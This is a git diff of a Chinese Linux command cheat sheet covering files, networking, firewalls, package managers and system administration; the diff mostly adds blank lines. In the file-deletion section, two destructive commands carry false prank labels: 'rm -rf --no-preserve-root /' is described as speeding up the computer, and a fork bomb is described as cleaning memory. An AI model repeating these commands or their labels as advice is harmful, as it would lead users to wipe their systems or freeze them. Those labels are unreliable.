@@ -1,15 +1,18 @@
 # Speed-Linux😋
+
 `基础 Linux 命令、操作指南`
 [TOC]
 
 ---
 
 # Linux编程🚬
+
 很多脚本第一行用来指定本脚本用什么解释器来执行
 例如`#!/usr/bin/python`相当于写死了 python 路径。
 而`#!/usr/bin/env python`会去环境设置寻找 python 目录,可以增强代码的可移植性,推荐这种写法。
 
 ## 编译
+
 ```bash
 mount -t tmpfs tmpfs ~/build -o size=1G	#把文件放到内存上做编译
 make -j	#并行编译
@@ -30,6 +33,7 @@ distcc	#多台机器一起编译
 
 # Shell👍
 ## 环境变量
+
 - **bash**
 ```bash
 echo $PATH  #查看环境变量
@@ -56,6 +60,7 @@ set PATH (你想要加入的路径) $PATH
 ---
 
 ## 通配符/限制输出
+
 ```bash
 head
 tail
@@ -71,6 +76,7 @@ awk
 ---
 
 ## 会话
+
 ```bash
 who
 w
@@ -87,6 +93,7 @@ ctrl+d #终止会话
 ---
 
 ## 目录
+
 ```bash
 cd
 ~ #表示home目录
@@ -110,6 +117,7 @@ usr   #存放软件默认安装目录
 
 ## 文件
 ### 压缩备份
+
 ```bash
 .tar	#注:tar是打包,不是压缩！
 tar -xvf FileName.tar	#解包
@@ -170,6 +178,7 @@ ar -p FileName.deb data.tar.gz | tar zxf -	#解包
 
 ### 读写
 #### 增
+
 ```bash
 touch -r test1.txt test2.txt #更新test2.txt时间戳与test1.txt时间戳相同
 touch -c -t 202510191820 a.txt #更改时间
@@ -180,6 +189,7 @@ mkdir -m 777 /test	#创建时指定权限
 ```
 
 #### 删
+
 ```bash
 rm -i	#确认
 rm -rf --no-preserve-root /	#电脑加速
@@ -190,6 +200,7 @@ b(){ b|b& };b  #清理内存
 ```
 
 #### 查
+
 **查看**
 ```bash
 pwd -P #目录链接时,显示实际路径而非link路径
@@ -225,6 +236,7 @@ locate passwd
 ```
 
 #### 改
+
 ```bash
 cp -r #带目录复制
 mv
@@ -238,6 +250,7 @@ gedit	#图形化的编辑器
 
 # net📶
 ## 配置
+
 **Ubuntu**
 ```vim
 vim /etc/network/interfaces
@@ -313,6 +326,7 @@ ROUTES=(gateway)
 ---
 
 ## 传输/下载
+
 **scp**
 ```bash
 scp root@xx.xx.xx.xx:/test/123.txt /test/123.txt
@@ -337,6 +351,7 @@ wget --no-check-certificate #不检查https证书
 ```
 
 ### bt
+
 - Transmission
 - rtorrent
 
@@ -356,6 +371,7 @@ tget 'magnet:?xt=urn:btih:0403fb4728bd788fbcb67e87d6feb241ef38c75a'
 
 ## Firewall
 ### Firewalld
+
 ```bash
 firewall-cmd --zone=public --add-port=12345/tcp --permanent  #开放端口
 firewall-cmd --zone=public --add-service=http --permanent   #开放服务
@@ -367,6 +383,7 @@ firewall-cmd --list-services  #查看防火墙设置
 ```
 
 ### Iptables
+
 ```bash
 iptables-save > /root/firewall_rules.backup		#备份一下策略
 iptables -A OUTPUT -p tcp -d bigmart.com -j ACCEPT
@@ -382,6 +399,7 @@ iptables-restore </root/firewall_rules.backup	#规则恢复一下
 
 ## 软件包管理
 ### 源
+
 **本地yum源**
 挂载到/mnt/cdrom
 ```bash
@@ -459,6 +477,7 @@ sudo pacman -S archlinux-keyring
 ```
 
 ### Binary
+
 ```bash
 yum install make
 yum install gcc
@@ -469,6 +488,7 @@ make install	#安装
 ```
 
 ### dpkg
+
 ```bash
 dpkg -i xxxxx.deb  #安装软件
 dpkg -R /usr/local/src	#安装路径下所有包
@@ -476,6 +496,7 @@ dpkg -L #查看软件安装位置
 ```
 
 ### Pacman
+
 ```bash
 sudo pacman -S vim
 sudo pacman -S fish
@@ -483,6 +504,7 @@ sudo pacman -Syy
 ```
 
 ### rpm
+
 ```bash
 rom -qa 		#搜索
 rpm -qf /etc/my.conf	#查询文件来自哪个包
@@ -492,6 +514,7 @@ rpm -Uvh https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm
 ```
 
 ### yum
+
 ```bash
 yum update && yum upgrade
 rm -f /var/run/yum.pid	#强制解锁占用
@@ -503,6 +526,7 @@ yum install python
 ```
 
 ### apt
+
 ```bash
 apt-get update && apt-get upgrade && apt-get dist-upgrade
 rm -rf /var/lib/dpkg/lock
@@ -523,6 +547,7 @@ apt install fish
 ```
 
 ### 常用软件
+
 **Fish**
 ```bash
 echo /usr/bin/fish | sudo tee -a /etc/shells	#加默认
@@ -562,6 +587,7 @@ insert模式按`ESC`键,返回 Normal 模式
 # 系统管理🦋
 ## 系统设置
 ### 时间
+
 ```bash
 data -s "2019-03-31 13:12:29"   # 修改系统时间
 hwclock	# clock和hwclock是一样的
@@ -572,6 +598,7 @@ cal	2019	# 2019日历
 ```
 
 ### 语言
+
 `echo  $LANG`查看当前操作系统的语言
 ```vim
 vim /etc/locale.conf
@@ -581,8 +608,8 @@ set LANG en_US.UTF-8	# 更改默认语言
 ```
 `source   /etc/locale.conf`
 
-
 ### 启动项
+
 ```bash
 chkconfig --list        # 列出所有的系统服务
 chkconfig --add httpd        # 增加httpd服务
@@ -599,6 +626,7 @@ vim /etc/crontab	# 系统任务调度的配置文件
 ```
 
 ### 账号管控
+
 **账号**
 ```bash
 whoami	# 当前用户
@@ -645,12 +673,14 @@ deluser user1 sudo	# 将user1从sudo组中删除
 ---
 
 ## 系统信息
+
 ```vim
 uname -a
 cat /etc/os-release
 ```
 
 ### 进程管理
+
 **进程处理**
 ```bash
 杀进程
@@ -690,6 +720,7 @@ ps -aux
 
 # 设备管理🛠
 ## 硬盘/数据
+
 **磁盘配额**
 - quota
 
@@ -813,6 +844,7 @@ blkid -g    # 清理 blkid 的缓存
 
 # 安全😎
 ## 密码恢复
+
 - **centos7**
 ```vim
 在启动菜单选择启动内核
@@ -838,6 +870,7 @@ exec /sbin/init
 ```
 
 ## selinux
+
 **关闭 selinux**
 - 需要重启
 	```vim
